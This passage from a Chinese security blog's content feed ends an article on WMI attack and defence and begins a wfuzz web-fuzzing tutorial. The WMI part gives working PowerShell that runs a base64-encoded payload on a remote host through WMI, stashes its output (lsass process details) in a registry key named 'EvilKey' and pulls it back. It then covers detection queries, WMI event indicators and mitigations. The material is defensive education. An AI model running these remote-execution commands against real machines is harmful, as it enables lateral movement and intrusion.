drop</span></span></span><br><span class="line">Get-WmiObject @CommonArgs -Class CIM_DataFile -Filter &#x27;Name =</span><br><span class="line">&quot;C:\\fighter_jet_specs.png&quot;&#x27;</span><br></pre></td></tr></table></figure>


<h5 id="Pull攻击"><a href="#Pull攻击" class="headerlink" title="Pull攻击"></a>Pull攻击</h5><p>下面的例子展示了如何通过注册表来等到PowerShell命令执行的结果。另外，许多恶意程序在获取PowerShell命令结果时都仅仅将结果以明文方式获取，这个例子使用了PowerShell对象的序列化和反序列化来获取富文本信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Credential = Get-Credential <span class="string">&#x27;WIN-B85AAA7ST4U\Administrator&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CommonArgs = @&#123;</span></span><br><span class="line">	Credential = $Credential</span><br><span class="line">	ComputerName = &#x27;192.168.72.131&#x27;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create a remote registry key and value</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">HKLM = 2147483650</span></span><br><span class="line">Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, &#x27;SOFTWARE\EvilKey&#x27;</span><br><span class="line">Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name DeleteValue -ArgumentList $HKLM, &#x27;SOFTWARE\EvilKey&#x27;, &#x27;Result&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PowerShell payload that saves the serialized output of `Get-Process lsass` to the registry</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">PayloadText = @<span class="string">&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">Payload = &#123;Get-Process lsass&#125;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">Result = &amp; $Payload</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">Output = [Management.Automation.PSSerializer]::Serialize($Result, 5)</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">Encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Output))</span></span></span><br><span class="line">Set-ItemProperty -Path HKLM:\SOFTWARE\EvilKey -Name Result -Value $Encoded</span><br><span class="line">&#x27;@</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">EncodedPayload =[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">PowerShellPayload = &quot;powershell -NoProfile -EncodedCommand $EncodedPayload&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Invoke PowerShell payload</span></span></span><br><span class="line">Invoke-WmiMethod @CommonArgs -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Pull the serialized results back</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">RemoteOutput = Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name GetStringValue -ArgumentList $HKLM, &#x27;</span>SOFTWARE\EvilKey<span class="string">&#x27;, &#x27;</span>Result<span class="string">&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">EncodedOutput = $RemoteOutput.sValue</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Deserialize and display the result of the command executed on the remote system</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">DeserializedOutput =[Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String($EncodedOutput)))</span></span></span><br></pre></td></tr></table></figure>

<h2 id="WMI-Providers（提供者）"><a href="#WMI-Providers（提供者）" class="headerlink" title="WMI Providers（提供者）"></a>WMI Providers（提供者）</h2><p>WMI提供者是WMI的主干。几乎所有的WMI类及其提供的方法都是通过提供者实现的。一个提供者就是一个用户态下的<code>COM DLL</code>或内核驱动。每一个提供者都在注册表中有对应的<code>CLSID</code>，用来做<code>COM Resolution</code>COM的方案。所有的注册的提供者都有与之相应的<code>__Win32Provider</code>的一个WMI类。例如，下面是来用处理注册表操作的已注册的WMI提供者：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PSComputerName   :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\Michael&gt; Get-CimInstance -Namespace root\cimv2 -ClassName __Win32Provider -Filter &#x27;Name=&quot;RegistryEventProvid</span><br><span class="line">er&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name                          : RegistryEventProvider</span><br><span class="line">ClientLoadableCLSID           :</span><br><span class="line">CLSID                         : &#123;fa77a74e-e109-11d0-ad6e-00c04fd8fdff&#125;</span><br><span class="line">Concurrency                   :</span><br><span class="line">DefaultMachineName            :</span><br><span class="line">Enabled                       :</span><br><span class="line">HostingModel                  : LocalSystemHost</span><br><span class="line">ImpersonationLevel            : 0</span><br><span class="line">InitializationReentrancy      : 0</span><br><span class="line">InitializationTimeoutInterval :</span><br><span class="line">InitializeAsAdminFirst        :</span><br><span class="line">OperationTimeoutInterval      :</span><br><span class="line">PerLocaleInitialization       : False</span><br><span class="line">PerUserInitialization         : False</span><br><span class="line">Pure                          : True</span><br><span class="line">SecurityDescriptor            :</span><br><span class="line">SupportsExplicitShutdown      :</span><br><span class="line">SupportsExtendedStatus        :</span><br><span class="line">SupportsQuotas                :</span><br><span class="line">SupportsSendStatus            :</span><br><span class="line">SupportsShutdown              :</span><br><span class="line">SupportsThrottling            :</span><br><span class="line">UnloadTimeout                 :</span><br><span class="line">Version                       :</span><br><span class="line">PSComputerName                :</span><br></pre></td></tr></table></figure>

<p>可以通过查看下面的注册表值来找到与<code>RegistryEventProvider</code>提供者相关的DLL文件：<br><code>HKEY_CLASSES_ROOT\CLSID\&#123;fa77a74e-e109-11d0-ad6e-00c04fd8fdff&#125;\InprocServer32 - (Default)</code></p>
<p>使用PowerShell可以枚举已注册的提供者的DLL信息。</p>
<h3 id="恶意WMI-Providers（提供者）"><a href="#恶意WMI-Providers（提供者）" class="headerlink" title="恶意WMI Providers（提供者）"></a>恶意WMI Providers（提供者）</h3><p>就像合法的WMI提供者可以为用户提供一些功能一样，恶意的WMI提供者也可以被用来拓展WMI的功能。</p>
<p>Casey和Jared Atkinson都给分享了一些利用恶意WMI提供者来执行代码的PowerShell脚本的例子。<br>[EvilWMIProvider][1]<br>[1]: <a href="https://github.com/subTee/EvilWMIProvider">https://github.com/subTee/EvilWMIProvider</a> “<a href="https://github.com/subTee/EvilWMIProvider&quot;">https://github.com/subTee/EvilWMIProvider&quot;</a><br>[EvilNetConnectionWMIProvider][2]<br>[2]:<a href="https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider">https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider</a></p>
<h2 id="WMI-防御"><a href="#WMI-防御" class="headerlink" title="WMI 防御"></a>WMI 防御</h2><h3 id="已有的检测工具"><a href="#已有的检测工具" class="headerlink" title="已有的检测工具"></a>已有的检测工具</h3><ul>
<li>Sysinternals Autoruns：传送门<a href="http://m0nst3r.me/web-sec/290.html" title="透过Autoruns看持久化绕过姿势的分享">透过Autoruns看持久化绕过姿势的分享</a><br>*<a href="https://github.com/davehull/Kansa/" title=" Kansa"> Kansa</a>: 一个用来做应急响应的PowerShell模块</li>
</ul>
<p>使用这些工具的不好之处就是它们只能检测到在某个时间 点上的WMI持久化。一些攻击者会在完成操作之后将持久化代码清除。当然，使用永久性WMI订阅来对付攻击者也能让我们即时抓住使用WMI做的持久化行为。</p>
<p>检测WMI持久化行为也不难。下面的PowerShell脚本就可以查询远程系统中所有的持久化的项。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Arguments = @&#123;</span></span><br><span class="line">	Credential = &#x27;WIN-B85AAA7ST4U\Administrator&#x27;</span><br><span class="line">	ComputerName = &#x27;192.168.72.135&#x27;</span><br><span class="line">	Namespace = &#x27;root\subscription&#x27;</span><br><span class="line">&#125;</span><br><span class="line">Get-WmiObject -Class __FilterToConsumerBinding @Arguments</span><br><span class="line">Get-WmiObject -Class __EventFilter @Arguments</span><br><span class="line">Get-WmiObject -Class __EventConsumer @Arguments</span><br></pre></td></tr></table></figure>

<h3 id="利用WMI检测WMI攻击"><a href="#利用WMI检测WMI攻击" class="headerlink" title="利用WMI检测WMI攻击"></a>利用WMI检测WMI攻击</h3><p>通过WMI提供的强大的事件系统，WMI可以被当作Microsoft免费提供给我们的IDS。由于基本所有的系统行为都可以引发一个WMI事件，所以WMI的确可以用来检测攻击行为。下面列举几个应对方法：</p>
<ul>
<li><p>攻击者使用WMI做持久化时：</p>
</li>
<li><p><code>__EventFilter</code>、<code>__EventConsumer</code>和<code>__FilterToConsumerBinding</code>的实例会被创建。一个<code>__InstanceCreationEvent</code>事件被触发。</p>
</li>
<li><p>当WMI被用做C2时：</p>
</li>
<li><p><code>__Namespace</code>对象实例会被创建和修改，结果是<code>__NamespaceCreationEvent</code>和<code>__NamespaceModificationEvent</code>事件被触发。</p>
</li>
<li><p>通过WMI类存储数据时：</p>
<ul>
<li><code>__ClassCreationEvent</code>事件被触发。</li>
</ul>
</li>
<li><p>攻击者安装WMI提供者时：</p>
<ul>
<li>一个<code>__Provider</code>类的实例被创建，<code>__InstanceCreationEvent</code>事件被触发。</li>
</ul>
</li>
<li><p>攻击者使用开始菜单或注册表做持久化时：</p>
</li>
<li><p>一个<code>Win32_StartupCommand</code>类的实例被创建，<code>__InstanceCreationEvent</code>事件被触发。</p>
</li>
<li><p>攻击者使用其它注册表值做持久化时：</p>
<ul>
<li><code>RegistrykeyChangeEvent</code>或<code>RegistryValueChangeEvent</code>事件被触发。</li>
</ul>
</li>
<li><p>当攻击者安装服务时：</p>
</li>
<li><p>一个<code>Win32_Service</code>实例被创建，<code>__InstanceCreationEvent</code>事件被触发。</p>
</li>
</ul>
<p>所有的攻击行为和产生的效果都可以通过WMI事件查询显示出来。把这些方法结合起来，防御者其实也可以有很大的发挥空间来应对这些攻击。</p>
<p>这些技术不好的地方就是，可以你得会使用VBScript编程，另外，对WMI攻击技术比较了解的人来说，它们可以在攻击之前会先把防御者所设置的防御措施删除。跟猫和老鼠的游戏一样。然而，删除需要管理权限，所以攻击者还是处于相对劣势的。最后作为防御者来说，还有一个好的办法防止攻击者删除我们的事件订阅，那就是注册并订阅<code>__EventFilter</code>、<code>__EventConsumer</code>和<code>__FilterToConsumerBinding</code>对象的<code>__InstanceDeletionEvent</code>事件。</p>
<h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><p>除了设置防御性的WMI事件订阅，还有一些其他缓解措施：</p>
<ul>
<li>考虑禁用WMI服务。不过Windows系统越来越多的依赖WMI和WinRM来管理，禁用时务必弄清影响范围及可行性。</li>
<li>考虑限制WMI协议端口。如果不需要远程使用WMI的话，可以把DCOM配置为单端口并限制该端口。这个比禁用WMI更实际一些。</li>
<li>WMI、DCOM和WinRM事件的事件日志保存在：</li>
<li>Microsoft-Windows-WinRM&#x2F;Operational</li>
<li>Microsoft-Windows-WMI-Activity&#x2F;Operational</li>
<li>Microsoft-Windows-DistributedCom</li>
</ul>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>史上最详[ZI]细[DUO]的wfuzz中文教程（三）——wfuzz 高级用法</title>
    <url>/web-sec/%E5%8F%B2%E4%B8%8A%E6%9C%80%E8%AF%A6%5BZI%5D%E7%BB%86%5BDUO%5D%E7%9A%84wfuzz%E4%B8%AD%E6%96%87%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94wfuzz%20%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95.html</url>
    <content><![CDATA[<blockquote>
<blockquote>
<p>本文已在丁牛网安实验室FreeBuf专栏 <a href="http://www.freebuf.com/column/163787.html" title="DigApis安全">DigApis安全</a> 中首发！引用转发请注明 “原文来自：DigApis安全 m0nst3r”字样，谢谢！</p>
</blockquote>
</blockquote>
<p>[TOC]</p>
<h2 id="wfuzz-高级用法"><a href="#wfuzz-高级用法" class="headerlink" title="wfuzz 高级用法"></a>wfuzz 高级用法</h2><hr>
<h3 id="wfuzz全局配置"><a href="#wfuzz全局配置" class="headerlink" title="wfuzz全局配置"></a>wfuzz全局配置</h3><p>wfuzz的全局配置文件位于<code>~/.wfuzz/wfuzz.ini</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $cat wfuzz.ini </span><br><span class="line">[kbase]</span><br><span class="line">discovery.blacklist = .svg-.css-.js-.jpg-.gif-.png-.jpeg-.mov-.avi-.flv-.ico #这里配置忽略的后缀，用 - 号分隔</span><br><span class="line"></span><br><span class="line">[connection]</span><br><span class="line">concurrent = 50 #并发数</span><br><span class="line">conn_delay = 90 #连接间隔</span><br><span class="line">req_delay = 90 #请求间隔</span><br><span class="line">retries = 3 #重试次数</span><br><span class="line">user-agent = Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0 #UA，默认为Wfuzz/版本</span><br><span class="line"></span><br><span class="line">[general]</span><br><span class="line">default_printer = raw #默认输出格式</span><br><span class="line">cancel_on_plugin_except = 1 #插件出错则退出</span><br><span class="line">concurrent_plugins = 3 #最多同时指定的插件数量</span><br><span class="line">lookup_dirs = /usr/share/wfuzz/wordlist,. #查找字典的目录，若让wfuzz自动查找字典，则在命令行中只指定字典名字即可</span><br><span class="line">encode_space = 1 #编码空格</span><br><span class="line"></span><br><span class="line">[plugins]</span><br><span class="line">bing_apikey =     #设置bing API在key</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Iterators：组合payloads"><a href="#Iterators：组合payloads" class="headerlink" title="Iterators：组合payloads"></a>Iterators：组合payloads</h3><p>不同的payload可以通过<code>-m</code>参数指定的方式组合起来，在wfuzz中，提供这种组合能力的功能的，我们称为迭代器。<br>关于wfuzz中所有可用的iterators可参考<code>重要关键词</code>部分。</p>
<p>下面我们举例说明各个iterator是如何工作的。</p>
<ul>
<li>zip:  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z list,a-b-c -z list,1-2-3 -m zip http://www.baidu.com/FUZZ/FUZ2Z</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://www.baidu.com/FUZZ/FUZ2Z</span><br><span class="line">Total requests: 3</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000001:  C=302      7 L	      18 W	    222 Ch	  &quot;a - 1&quot;</span><br><span class="line">000002:  C=302      7 L	      18 W	    222 Ch	  &quot;b - 2&quot;</span><br><span class="line">000003:  C=302      7 L	      18 W	    222 Ch	  &quot;c - 3&quot;</span><br><span class="line"></span><br><span class="line">Total time: 0.101380</span><br><span class="line">Processed Requests: 3</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 29.59160</span><br></pre></td></tr></table></figure></li>
<li>chain: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z list,a-b-c -z list,1-2-3 -m chain http://www.baidu.com/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://www.baidu.com/FUZZ</span><br><span class="line">Total requests: 6</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000003:  C=302      7 L	      18 W	    208 Ch	  &quot;c&quot;</span><br><span class="line">000004:  C=302      7 L	      18 W	    222 Ch	  &quot;1&quot;</span><br><span class="line">000005:  C=302      7 L	      18 W	    222 Ch	  &quot;2&quot;</span><br><span class="line">000006:  C=302      7 L	      18 W	    222 Ch	  &quot;3&quot;</span><br><span class="line">000001:  C=302      7 L	      18 W	    222 Ch	  &quot;a&quot;</span><br><span class="line">000002:  C=302      7 L	      18 W	    222 Ch	  &quot;b&quot;</span><br><span class="line"></span><br><span class="line">Total time: 0.041357</span><br><span class="line">Processed Requests: 6</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 145.0780</span><br></pre></td></tr></table></figure></li>
<li>product: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z list,a-b-c -z list,1-2-3 -m product http://www.baidu.com/FUZZ/FUZ2Z</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://www.baidu.com/FUZZ/FUZ2Z</span><br><span class="line">Total requests: 9</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000008:  C=302      7 L	      18 W	    222 Ch	  &quot;c - 2&quot;</span><br><span class="line">000009:  C=302      7 L	      18 W	    222 Ch	  &quot;c - 3&quot;</span><br><span class="line">000001:  C=302      7 L	      18 W	    222 Ch	  &quot;a - 1&quot;</span><br><span class="line">000002:  C=302      7 L	      18 W	    222 Ch	  &quot;a - 2&quot;</span><br><span class="line">000003:  C=302      7 L	      18 W	    222 Ch	  &quot;a - 3&quot;</span><br><span class="line">000004:  C=302      7 L	      18 W	    222 Ch	  &quot;b - 1&quot;</span><br><span class="line">000005:  C=302      7 L	      18 W	    222 Ch	  &quot;b - 2&quot;</span><br><span class="line">000006:  C=302      7 L	      18 W	    222 Ch	  &quot;b - 3&quot;</span><br><span class="line">000007:  C=302      7 L	      18 W	    222 Ch	  &quot;c - 1&quot;</span><br><span class="line"></span><br><span class="line">Total time: 0.042347</span><br><span class="line">Processed Requests: 9</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 212.5252</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="Encoders"><a href="#Encoders" class="headerlink" title="Encoders"></a>Encoders</h3><p>在wfuzz中，encoder的作用是将payload从一种格式转换成另一种格式。<br>关于wfuzz中所有可用的encoders可参考<code>重要关键词</code>部分。</p>
<hr>
<h4 id="使用Encoder"><a href="#使用Encoder" class="headerlink" title="使用Encoder"></a>使用Encoder</h4><p>encoders是通过payload参数传进去的。有两种方法：</p>
<ul>
<li>第一种稍长：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z file --zP fn=common.txt,encoder=md5 http://testphp.vulnweb.com/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/FUZZ</span><br><span class="line">Total requests: 950</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000034:  C=404      7 L	      12 W	    168 Ch	  &quot;9cdc4bbeede81cec7451d2c84028d26e&quot;</span><br><span class="line">000035:  C=404      7 L	      12 W	    168 Ch	  &quot;b37cb0782bed24a15f24b3e16d63d6e3&quot;</span><br><span class="line">000036:  C=404      7 L	      12 W	    168 Ch	  &quot;fb61758d0f0fda4ba867c3d5a46c16a7&quot;</span><br><span class="line">000001:  C=404      7 L	      12 W	    168 Ch	  &quot;e1671797c52e15f763380b45e841ec32&quot;</span><br><span class="line">000002:  C=404      7 L	      12 W	    168 Ch	  &quot;b4b147bc522828731f1a016bfa72c073&quot;</span><br><span class="line">000003:  C=404      7 L	      12 W	    168 Ch	  &quot;96a3be3cf272e017046d1b2674a52bd3&quot;</span><br><span class="line">000004:  C=404      7 L	      12 W	    168 Ch	  &quot;a2ef406e2c2351e0b9e80029c909242d&quot;</span><br><span class="line">000005:  C=404      7 L	      12 W	    168 Ch	  &quot;e45ee7ce7e88149af8dd32b27f9512ce&quot;</span><br><span class="line">000006:  C=404      7 L	      12 W	    168 Ch	  &quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
<li>第二种比较短的方式：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z file,common.txt,md5 http://testphp.vulnweb.com/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/FUZZ</span><br><span class="line">Total requests: 950</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000034:  C=404      7 L	      12 W	    168 Ch	  &quot;9cdc4bbeede81cec7451d2c84028d26e&quot;</span><br><span class="line">000035:  C=404      7 L	      12 W	    168 Ch	  &quot;b37cb0782bed24a15f24b3e16d63d6e3&quot;</span><br><span class="line">000036:  C=404      7 L	      12 W	    168 Ch	  &quot;fb61758d0f0fda4ba867c3d5a46c16a7&quot;</span><br><span class="line">000037:  C=404      7 L	      12 W	    168 Ch	  &quot;c33e404a441c6ba9648f88af3c68a1ca&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="使用多个Encoder"><a href="#使用多个Encoder" class="headerlink" title="使用多个Encoder"></a>使用多个Encoder</h4><ul>
<li><p>一次指定多个encoders，可以使用一个<code>-</code>号分隔的列表来指定，如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z list,1-2-3,md5-sha1-none http://testphp.vulnweb.com/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/FUZZ</span><br><span class="line">Total requests: 9</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000001:  C=404      7 L	      12 W	    168 Ch	  &quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span><br><span class="line">000002:  C=404      7 L	      12 W	    168 Ch	  &quot;356a192b7913b04c54574d18c28d46e6395428ab&quot;</span><br><span class="line">000005:  C=404      7 L	      12 W	    168 Ch	  &quot;da4b9237bacccdf19c0760cab7aec4a8359010b0&quot;</span><br><span class="line">000006:  C=404      7 L	      12 W	    168 Ch	  &quot;2&quot;</span><br><span class="line">000007:  C=404      7 L	      12 W	    168 Ch	  &quot;eccbc87e4b5ce2fe28308fd9f2a7baf3&quot;</span><br><span class="line">000008:  C=404      7 L	      12 W	    168 Ch	  &quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;</span><br><span class="line">000004:  C=404      7 L	      12 W	    168 Ch	  &quot;c81e728d9d4c2f636f067f89cc14862c&quot;</span><br><span class="line">000003:  C=404      7 L	      12 W	    168 Ch	  &quot;1&quot;</span><br><span class="line">000009:  C=404      7 L	      12 W	    168 Ch	  &quot;3&quot;</span><br><span class="line"></span><br><span class="line">Total time: 1.933195</span><br><span class="line">Processed Requests: 9</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 4.655503</span><br></pre></td></tr></table></figure>
</li>
<li><p>同时按顺序使用多个encoders，可以使用一个<code>@</code>号分隔的列表来指定，如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z list,1-2-3,sha1-sha1@none http://testphp.vulnweb.com/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/FUZZ</span><br><span class="line">Total requests: 6</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000002:  C=404      7 L	      12 W	    168 Ch	  &quot;356a192b7913b04c54574d18c28d46e6395428ab&quot;</span><br><span class="line">000003:  C=404      7 L	      12 W	    168 Ch	  &quot;da4b9237bacccdf19c0760cab7aec4a8359010b0&quot;</span><br><span class="line">000004:  C=404      7 L	      12 W	    168 Ch	  &quot;da4b9237bacccdf19c0760cab7aec4a8359010b0&quot;</span><br><span class="line">000001:  C=404      7 L	      12 W	    168 Ch	  &quot;356a192b7913b04c54574d18c28d46e6395428ab&quot;</span><br><span class="line">000005:  C=404      7 L	      12 W	    168 Ch	  &quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;</span><br><span class="line">000006:  C=404      7 L	      12 W	    168 Ch	  &quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;</span><br><span class="line"></span><br><span class="line">Total time: 0.896903</span><br><span class="line">Processed Requests: 6</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 6.689686</span><br></pre></td></tr></table></figure>
<p>上面参数中的<code>sha1@none</code>，会将payload先进行<code>sha1</code>，然后传给<code>none</code>这个encoder。</p>
</li>
<li><p>Encoders是分类的，我们还可以使用类型名称来指定同类的所有encoders：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z list,1-2-3,hashes http://testphp.vulnweb.com/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/FUZZ</span><br><span class="line">Total requests: 3</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000002:  C=404      7 L	      12 W	    168 Ch	  &quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span><br><span class="line">000003:  C=404      7 L	      12 W	    168 Ch	  &quot;356a192b7913b04c54574d18c28d46e6395428ab&quot;</span><br><span class="line">000004:  C=404      7 L	      12 W	    168 Ch	  &quot;Mg==&quot;</span><br><span class="line">000005:  C=404      7 L	      12 W	    168 Ch	  &quot;c81e728d9d4c2f636f067f89cc14862c&quot;</span><br><span class="line">000006:  C=404      7 L	      12 W	    168 Ch	  &quot;da4b9237bacccdf19c0760cab7aec4a8359010b0&quot;</span><br><span class="line">000007:  C=404      7 L	      12 W	    168 Ch	  &quot;Mw==&quot;</span><br><span class="line">000008:  C=404      7 L	      12 W	    168 Ch	  &quot;eccbc87e4b5ce2fe28308fd9f2a7baf3&quot;</span><br><span class="line">000001:  C=404      7 L	      12 W	    168 Ch	  &quot;MQ==&quot;</span><br><span class="line">000009:  C=404      7 L	      12 W	    168 Ch	  &quot;77de68daecd823babbb58edb1c8e14d7106e83bb&quot;</span><br><span class="line"></span><br><span class="line">Total time: 1.884471</span><br><span class="line">Processed Requests: 9</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 4.775873</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="扫描-x2F-解析插件"><a href="#扫描-x2F-解析插件" class="headerlink" title="扫描&#x2F;解析插件"></a>扫描&#x2F;解析插件</h3><p>wfuzz的扫描和解析都是通过插件来实现的。<br>关于wfuzz中所有可用的scripts可参考<code>重要关键词</code>部分。<br>插件脚本（scripts）是分类的。一个脚本可以同时属于多个分类。</p>
<p>wfuzz有两个分类：</p>
<ul>
<li>passive：这些插件实现分析已经得到的请求和响应，不产生新的请求。</li>
<li>active：这些插件会向目标发送请求来探测漏洞是否存在。</li>
</ul>
<p>还有一类附加插件：</p>
<ul>
<li>discovery：这些插件会自动帮助wfuzz对目标站进行爬取，并将发现的内容提供给wfuzz进行请求。</li>
</ul>
<p>使用<code>-A</code>与<code>--script=default</code>相同。</p>
<p>举例来说，一个分析robots.txt的wfuzz命令如下：</p>
